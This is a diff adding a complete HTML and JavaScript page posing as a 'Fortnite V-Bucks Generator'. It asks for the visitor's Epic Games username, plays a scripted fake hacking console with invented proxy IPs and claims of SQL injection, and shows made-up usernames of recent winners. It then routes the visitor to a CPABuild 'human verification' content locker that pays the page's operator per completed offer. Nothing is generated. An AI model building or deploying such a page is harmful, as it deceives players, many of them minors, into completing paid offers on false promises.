@@ -1,0 +1,733 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="">
+
+    <title>Fortnite V-Bucks Generator [Last Updated Today]</title>
+
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+	
+	<style>
+	@import url('https://fonts.googleapis.com/css?family=Open+Sans:400,600,700');
+	@font-face{
+	   font-family:'Burbank';
+	   src:url('https://db.onlinewebfonts.com/t/800e985f75a5a56c2f7b4be502d286de.woff2') format('woff2'),url('https://db.onlinewebfonts.com/t/800e985f75a5a56c2f7b4be502d286de.woff') format('woff');
+	   font-weight:700;
+	   font-style:normal;
+	}
+	body{
+	   font-family:'Burbank',sans-serif;
+	   color:#FFF;
+	   font-size:46px;
+	   background: url('assetsvbvx/bg.png');
+	   background-color: rgba(16,110,160,.98);
+	   background-position:top center;
+	   width:100%;
+	   height:100%;
+	   overflow-x:hidden;
+	}
+	html{
+	   width:100%;
+	   height:100%;
+	}
+	div#main {
+	   text-align: center;
+       padding-top: 90px;
+    }
+	#step3 .vbucks-btn p{
+	  margin-top: 38px!important;
+          font_size: 30px;
+	}
+	h1{
+	   margin-bottom: -4px!important;
+           margin-top: -6px!important;
+	   font-size: 17px!important;
+	   color: #6fc3ef;
+           padding: 0 6px 0 6px;
+	}
+	h2{
+	   margin-bottom: -2px!important;
+	   color: #f2faff;
+           padding: 0 6px 0 6px;
+	}
+	h3{
+           margin-bottom: 32px!important;
+	   padding-bottom: 40px;
+	   font-size: 23px!important;
+	   color: #ccedff;
+           padding: 0 6px 0 6px;
+	}
+        div#step2 h1{
+	   margin-bottom: 0px!important;
+           margin-top: -2px!important;
+	   font-size: 22px!important;
+           color: #cdedff!important;
+         }
+        div#step3 h1{
+	   margin-bottom: 0px!important;
+           margin-top: -2px!important;
+	   font-size: 22px!important;
+           color: #cdedff!important;
+         }
+        div#step4 h1{
+	   margin-bottom: 0px!important;
+           margin-top: -2px!important;
+	   font-size: 22px!important;
+           color: #cdedff!important;
+         }
+         p{
+         margin-bottom: 0!important;
+        }
+	#step1{
+	   display: block;
+	}
+	#step2{
+	   display: none;
+	}
+	#step2 input[type=text]{
+	   width:100%;
+	   max-width:474px;
+	   padding:2px 15px;
+	   margin: 0 6px 0 6px;
+	   font-family:'Burbank',sans-serif;
+	   font-size: 36px;
+	}
+	#step3{
+	   display: none;
+	}
+         #step3 input[type=image]{
+	   max-height: 285px;
+	}
+	#step4{
+	   display: none;
+	}
+	div#banner { 
+       position: absolute; 
+       top: 0; 
+       left: 0; 
+       background-color: #000; 
+       width: 100%; 
+    }
+    div#banner-content {
+	   text-align: center;
+            color: #ffffff;
+            font-family:'Burbank',sans-serif;
+	   font-size: 44px; 
+       width: 100%; 
+       margin: 0 auto; 
+       padding: 2px; 
+       border: 1px solid #000;
+    }
+	.platform-btn{
+	   font-size: 26px!important;
+	   background-color: #ff0;
+       color: #000;
+	   border: none;
+	   text-decoration: none;
+       width: 140px;
+	   height: 140px;
+       padding: 10px;
+       margin: 12px 6px 6px 6px;
+       line-height: 1;
+       overflow: hidden;
+	}
+	.error{
+	   border-left:5px solid #F00!important;
+	}
+	.actived{
+	   border-left:5px solid #8AFF00!important;
+	}
+	.username-btn{
+	   font-size: 36px!important;
+	   background-color: #ff0;
+       color: #000;
+	   border: none;
+	   text-decoration: none;
+       width: 250px;
+	   height: 70px;
+       padding: 10px;
+       margin: 12px 6px 10px 6px;
+       line-height: 1;
+       overflow: hidden;
+	   opacity: 0.7;
+	}
+	.vbucks-btn{
+	   font-size: 30px!important;
+           font-weight: lighter!important;
+	   background-color: #ff0;
+       color: #000;
+	   border: none;
+	   text-decoration: none;
+       width: 208px;
+	   height: 355px;
+       line-height: 0;
+	   display: inline-block;
+       overflow: hidden;
+	   border-radius: 3px;
+	}
+	#v-buck1{
+	    width: 209px;
+	   border-radius: 2px!important;
+	}
+	#v-buck2{
+	    width: 209px;
+	   border-radius: 2px!important;
+	}
+	#v-buck3{
+	    width: 209px;
+	   border-radius: 2px!important;
+	}
+	#v-buck4{
+	    width: 209px;
+	   border-radius: 2px!important;
+	}
+	.console{
+	   display: inline-block;
+	   text-align: center;
+	   font-size: 18px;
+	   background-color: #ff0;
+       color: #000;
+	   border-color: #5e5b5b;
+	   border-radius: 40px;
+	   border-style: solid;
+       border-width: 7.5px;
+       width: 375px;
+	   height: 220px;
+	   padding: 15px 7.5px 15px 7.5px;
+       overflow: hidden;
+	}
+	#console{
+	   display: inline-block;
+	   text-align: center;
+	   margin-top: 0;	   
+	}
+	#verification{
+	   padding-top: 10px;
+	   opacity: 0;
+	   display: none;
+	}
+.verify-btn{
+	   font-size: 22px!important;
+        background-color: #0cd10c;
+       color: #000;
+       border: none;
+       border-style: solid;
+       border-width: 3px;
+       border-color: #77e00e91;
+       border-radius: 2px;
+       padding-top: 5px;
+       width: 140px;
+       height: 36px;
+       line-height: 0;
+       display: inline-block;
+       overflow: hidden;
+	}
+	.gen{
+	   line-height: 0.5;
+	   margin-top: 40px;
+	   color: #ff0;
+	   background-color: #001521;
+	   border-style: solid;
+       border-width: 2px;
+	   border-color: #014c77;
+       width: 380px;
+	   height: 80px;
+       padding: 14px;
+	   border-radius: 6px;
+       overflow: hidden;
+	   display: inline-block;
+	   font-size: 26px!important;
+	}
+	.name{
+	   opacity: 0;
+	   font-size: 27px!important;
+	   color: #fff;
+	}
+	.nb{
+	   opacity: 0;
+	   font-size: 28px!important;
+	   color: #fff;
+	}
+	.gentext{
+	   opacity: 0;
+	   font-size: 26px!important;
+	   color: #fff;
+	}
+	.logo{
+	   margin-top: -4px;
+	}
+	</style>
+<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":622172,"key":"99e94"};
+</script>
+<script src="https://cpabuild.com/public/external/locker.js"></script>
+<script>
+function CPABuildComplete(){
+	alert("Offer Complete!")
+}
+</script>
+</head>
+
+<body>
+	<div id="banner">
+       <div id="banner-content">
+       &nbsp;&nbsp;Ultimate-<img src="assetsvbvx/fortnite.png" class="logo" alt="fortnite" height="40px" width="40px">-Generator<br>
+       </div>
+    </div>
+	
+<div id="main">
+	<div>
+        <h1>(Last updated today <span id="date"></span>)</h1>
+	   <h2>Generate thousands of V-BUCKS for all of your accounts</h2>
+       <h3>We guarantee 100% V-BUCKS and a 0% ban rate!</h3>
+	</div>
+    <div id="step1">	
+	   <p>Where do you play?</p>
+	   <button class="platform-btn">
+	      <img src="assetsvbvx/ps.png" alt="ps" height="90" width="90">
+	      PS4
+	   </button>
+	   <button class="platform-btn">
+	      <img src="assetsvbvx/xbox.png" alt="xbox" height="80" width="80">
+	      Xbox
+	   </button>
+	   <button class="platform-btn">
+	      <img src="assetsvbvx/switch.png" alt="switch" height="70" width="70">
+	      Switch
+	   </button>
+	   <button class="platform-btn">
+	      <img src="assetsvbvx/pc.png" alt="pc" height="80" width="80">
+	      PC/Mac
+	   </button>
+	   <button class="platform-btn" >
+	      <img src="assetsvbvx/mobile.png" alt="mobile" height="60" width="60">
+	      Mobile
+	   </button>
+	</div>
+	
+	<div id="step2">
+	   <p>What is your username?</p>
+	   <input type="text" name="name" id="name" /></br>
+       <button class="username-btn" disabled>Next</button>
+	   <h1>Note: Enter your <u>exact</u> Epic Games Username, with proper capitalization!</h1>
+	</div>
+	
+	<div id="step3">
+	   <p>Choose your V-BUCKS package</p>
+		<div class="vbucks-btn">
+			<input type="image" value="1000" name="v-buck1" id="v-buck1" src="assetsvbvx/vb1.png" alt="vb1"><p>1000 V-BUCKS</p>
+		</div>
+		<div class="vbucks-btn">
+			<input type="image" value="2300" name="v-buck2" id="v-buck2" src="assetsvbvx/vb2.png" alt="vb2"><p>2300 V-BUCKS</p>
+		</div>
+		<div class="vbucks-btn">
+			<input type="image" value="5000" name="v-buck3" id="v-buck3" src="assetsvbvx/vb3.png" alt="vb3"><p>5000 V-BUCKS</p>
+		</div>
+		<div class="vbucks-btn">
+			<input type="image" value="13500" name="v-buck4" id="v-buck4" src="assetsvbvx/vb4.png" alt="vb4"><p>13500 V-BUCKS</p>
+		</div>
+	</div>
+	
+	<div id="step4">
+	   <p>Generating<span id="wait"></span></p>
+	   <div class="console"><strong>
+	        <div id="console"></div>
+			<div id="verification">
+               <button class="verify-btn" onclick="CPABuildLock()">VERIFY NOW</button><br><br>
+			   <span>time left: <span id="time"></span> minute(s)</span>
+            </div>
+		</div></strong>
+	    <h1>Note: Please don't leave <u>this page</u> while generating is in progress!</h1>
+	</div>
+	
+    <div class="gen">
+	    <div>Last generated V-BUCKS:<br><br><span class="name" id="nameGenerate">User</span><span class="gentext" id="buck"> generated: +</span><span class="nb" id="nbGenerate">1 000</span></div>
+	</div>
+</div>
+	
+	<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>  
+    <script>
+n =  new Date();
+y = n.getFullYear();
+m = n.getMonth() + 1;
+d = n.getDate();
+document.getElementById("date").innerHTML = m + "/" + d + "/" + y;
+$( document ).ready(function() {
+ 
+    $( ".platform-btn" ).click(function( event ) {
+ 
+        $('#step1').animate({
+               left:'0px',
+               opacity:0
+           },300, function(){
+              $('#step1').css('display','none');
+              $('#step2').css('display','block');
+              $('#step2').animate({
+                 left:'0px',
+                 opacity:1
+              },300);
+           });
+ 
+    });
+ 
+});
+
+$( document ).ready(function() {
+ 
+    $( ".username-btn" ).click(function( event ) {
+ 
+        $('#step2').animate({
+               left:'0px',
+               opacity:0
+           },300, function(){
+              $('#step2').css('display','none');
+              $('#step3').css('display','block');
+              $('#step3').animate({
+                 left:'0px',
+                 opacity:1
+              },300);
+           });
+ 
+    });
+ 
+});
+
+$( document ).ready(function() {
+ 
+    $( "#v-buck1,#v-buck2,#v-buck3,#v-buck4" ).click(function( event ) {
+ 
+        $('#step3').animate({
+               left:'0px',
+               opacity:0
+           },300, function(){
+              $('#step3').css('display','none');
+              $('#step4').css('display','block');
+              $('#step4').animate({
+                 left:'0px',
+                 opacity:1
+              },300);
+           });
+ 
+    });
+ 
+});
+
+    var nameValue = '';
+    var validName = false;
+    var elementName = document.getElementById('name');
+
+        elementName.addEventListener('keyup', function(){
+            
+            nameValue = document.getElementById('name').value;
+            
+            if(nameValue.length < 3){
+                $('#name').removeClass('actived');
+                $('#name').addClass('error');
+				validName = false;
+                
+            }
+            else if(nameValue.length >= 3){
+                $('#name').removeClass('error');
+                $('#name').addClass('actived');
+                $('.username-btn').prop("disabled", false);
+                $('.username-btn').animate({
+                    'opacity':1
+                }, 300);
+                $('.username-btn').css('cursor','pointer');
+                validName = true;
+                
+            }
+            else{
+                $('#name').removeClass('actived');
+                $('#name').removeClass('error');
+                validName = false;
+            }
+            
+        });
+		
+		var buckValue = '';
+        var elementBuck = document.getElementById('v-buck1');
+
+        elementBuck.addEventListener('click', function(){       
+            buckValue = document.getElementById('v-buck1').value;			           
+        });
+		var elementBuck = document.getElementById('v-buck2');
+
+        elementBuck.addEventListener('click', function(){       
+            buckValue = document.getElementById('v-buck2').value;			           
+        });
+		var elementBuck = document.getElementById('v-buck3');
+
+        elementBuck.addEventListener('click', function(){       
+            buckValue = document.getElementById('v-buck3').value;			           
+        });
+		var elementBuck = document.getElementById('v-buck4');
+
+        elementBuck.addEventListener('click', function(){       
+            buckValue = document.getElementById('v-buck4').value;			           
+        });
+		
+	   var dots = window.setInterval( function() {
+       var wait = document.getElementById("wait");
+       if ( wait.innerHTML.length > 2 ) 
+           wait.innerHTML = "";
+       else 
+           wait.innerHTML += ".";
+    }, 700);
+
+
+$( document ).ready(function() {
+ 
+    $( "#v-buck1,#v-buck2,#v-buck3,#v-buck4" ).click(function( event ) {
+	
+	var ip = '';
+            var ipFinal = '';
+            
+            function generateIp(){
+
+                for(var ipLength = '0'; ipLength < '4';){
+
+                    ip = Math.round(Math.random()*255)+1;
+
+                    if(ipLength < 3){
+                        ipFinal += ip+'.';
+                    }
+                    else{
+                        ipFinal += ip;
+                    }
+
+                    ipLength++;
+                }
+            }
+
+            generateIp();
+
+           var consoleValue = ' Starting generator... < \
+			< \
+           1/5 CONNECTING TO USERNAME 🔎< \
+            > Connecting to proxy server on '+ipFinal+'... < \
+            > Searching for username '+nameValue+'...   < \
+             . . . < \
+            Successfully found username '+nameValue+'! < \
+		      < \
+           2/5 ACCESSING DATABASE 💾< \
+            > Injecting latest Fortnite SQL on '+ipFinal+'... < \
+            > Bypassing ip verification and opening database... < \
+            . . . < \
+            > Successfully opened Fortnite Database! < \
+             < \
+            3/5 UPDATING V-BUCKS 📂< \
+            > Going to '+nameValue+'\u0027s data string... < \
+            > Opening editor with dev key \u0027'+ip+'evFwEV'+ip+'ec\u0027... < \
+            > Adding '+buckValue+' V-BUCKS to '+nameValue+'\u0027s account... < \
+             . . . < \
+			Successfully generated '+buckValue+' V-BUCKS! < \
+			< \
+             4/5 CLEANING UP ⏳ < \
+			> Setting date & version to standart... < \
+            > Cleaning up injection traces... < \
+             . . . < \
+             All traces successfully removed! < \
+			< \
+			5/5 HUMAN VERIFICATION 👇 < \
+                       > You need to complete fast&easy verification. 👍 < \
+                        Your V-BUCKS will unlock instantly once completed.  €';
+
+            display = document.getElementById('console');
+            $('#console').css('max-height','160px');
+            $('#console').css('position','relative');
+            $('#console').css('overflow','auto');
+            $('#console').css('overflow-y','hidden');
+            
+            var speed = '29';
+            var r = '2000';
+            
+            function writeConsole(){
+
+                for(var i = 0, l = consoleValue.length; i < l; i++) {
+                    
+                    (function(i) {
+                     
+                        setTimeout(function() {
+
+                            if(consoleValue.charAt(i) == '<'){
+                                display.innerHTML += '<br>';
+                            }
+                            else if(consoleValue.charAt(i) == '€'){
+				$('#console').css('margin-top','-80px');
+                                $('#verification').css('display', 'block');
+                                $('#verification').animate({'opacity':'1'});
+                            }
+                            else {
+                                display.innerHTML += consoleValue.charAt(i);
+                            }
+                            display.scrollTop = display.scrollHeight;
+                            
+                        } , i * speed);
+                        
+                    }(i));
+                }
+
+                return false;
+            }
+            
+            setTimeout(writeConsole() , r);
+         });
+});	
+var nameGenerate = '';
+        var nbGenerate = '';
+        var nameStart = '';
+        var nameMid = '';
+        var nameEnd = '';
+        
+        var startNameGenerate = Array('', 'xXx', 'Xx', '@', '_', 'Jon_', 'love', 'Love', '-=', '.');
+        var midNameGenerate = Array('artic', 'fran', '@', 'JuL', 'mike', 'poney', 'china', 'mehdi', 'momo', 'IkIllU', 'imthebest', 'ludwig', 'om', 'bart', 'FrEddY', 'GiL', '10101010', 'arb', '@tiou', 'luciol', 'franck', 'will', 'M@ma', 'DustYYY', 'JOhn', 'dave', 'david', 'phil', 'sun', 'Tsuna', 'Lidy', 'lidi', 'S@ra', 'Zoo_', 'H@o-', 'yurÏ_', '-_-', 'ruDolf', '@m@', 'iZi', 'Luka', 'touyou', 'BestGamer');
+        var endNameGenerate = Array('', 'xXx', 'xX', '@', '_', 'Gaming', '_gaming', '_Gaming', 'gaming', 'love', 'girl', 'Girl', 'Love', '=-', '.', '75', '_76', '_77', '_80', '_78', '_79', '_95');
+        
+        var nbBuckGenerate = Array('1 000', '2 300', '5 000', '5 000', '5 000',  '5 000', '13 500', '13 500', '13 500', '13 500', '13 500', '13 500', '13 500', '13 500');
+        
+        function generateStart(){
+            nbNameStart = Math.floor(Math.random()*startNameGenerate.length);
+            nameStart = startNameGenerate[nbNameStart];
+            
+            nbNameMid = Math.floor(Math.random()*midNameGenerate.length);
+            nameMid = midNameGenerate[nbNameMid];
+            
+            nbNameEnd = Math.floor(Math.random()*endNameGenerate.length);
+            nameEnd = endNameGenerate[nbNameEnd];
+            
+            nameGenerate = nameStart+''+nameMid+''+nameEnd;
+            nbGenerate = nbBuckGenerate[Math.floor(Math.random()*nbBuckGenerate.length)];            
+            
+            $('#nameGenerate').html(nameGenerate);
+            $('#nbGenerate').html(nbGenerate);
+            
+            $('#nameGenerate').css ('opacity','1');    
+            
+            $('#buck').css ('opacity','1');
+            
+            $('#nbGenerate').css ('opacity','1');
+        }
+        
+        generateStart();
+        
+        function generateBucks(){
+            nbNameStart = Math.floor(Math.random()*startNameGenerate.length);
+            nameStart = startNameGenerate[nbNameStart];
+            
+            nbNameMid = Math.floor(Math.random()*midNameGenerate.length);
+            nameMid = midNameGenerate[nbNameMid];
+            
+            nbNameEnd = Math.floor(Math.random()*endNameGenerate.length);
+            nameEnd = endNameGenerate[nbNameEnd];
+            
+            nameGenerate = nameStart+''+nameMid+''+nameEnd;
+            nbGenerate = nbBuckGenerate[Math.floor(Math.random()*nbBuckGenerate.length)];
+            
+            $('#nameGenerate').css('opacity', '0');
+            $('#nbGenerate').css('opacity', '0');
+            $('#buck').css('opacity', '0');
+            
+            
+            $('#nameGenerate').html(nameGenerate);
+            $('#nbGenerate').html(nbGenerate);
+            
+            $('#nameGenerate').animate ({
+                'opacity' : 1    
+            },300);
+            
+            $('#buck').animate ({
+                'opacity' : 1    
+            },300);
+            
+            $('#nbGenerate').animate ({
+                'opacity' : 1    
+            },300);
+        }
+        
+        
+        
+        var timer = '0';
+        
+        
+        function nbTimer(){
+            timer = Math.floor(Math.random()*4000)+4000;
+        }
+        
+        var myInterval;
+        
+        function loopGenerate(){
+            nbTimer();
+            
+            myInterval = setInterval(generateBucks,timer);
+            
+        }
+        
+        loopGenerate();	
+
+$( document ).ready(function() {
+ 
+    $( "#v-buck1,#v-buck2,#v-buck3,#v-buck4" ).click(function( event ) {
+
+function timef(){
+            var time;
+            var minutes = '';
+            var minutesFinal = '';
+            var seconds = '';
+            var secondsFinal = '';
+            
+            minutes = 3;
+            seconds = 47;
+            $('#time').html(time);
+            //console.log(minutes[i]);
+            
+            
+            
+            function calcTime(){
+                if(seconds > 0){
+                    seconds -= 1;
+                } 
+                else {
+                    seconds = 59;
+                    minutes -= 1;
+                }
+                if(minutes < 0){
+                    minutes = 0;
+                    seconds = 0;
+                    clearInterval(timeLoop);
+                }
+                
+                if(minutes < 10){
+                    minutesFinal = '0'+minutes;
+                }
+                else {
+                    minutesFinal = minutes;
+                }
+
+                if(seconds < 10){
+                    secondsFinal = '0'+seconds;
+                }
+                else {
+                    secondsFinal = seconds;
+                }
+
+                time = minutesFinal+' : '+secondsFinal;
+                
+                $('#time').html(time);
+
+            }
+            
+            var timeLoop = setInterval(calcTime, 1000);
+            
+        };
+        
+        timef();
+   });
+});    		
+	</script>
+</body>
+</html>
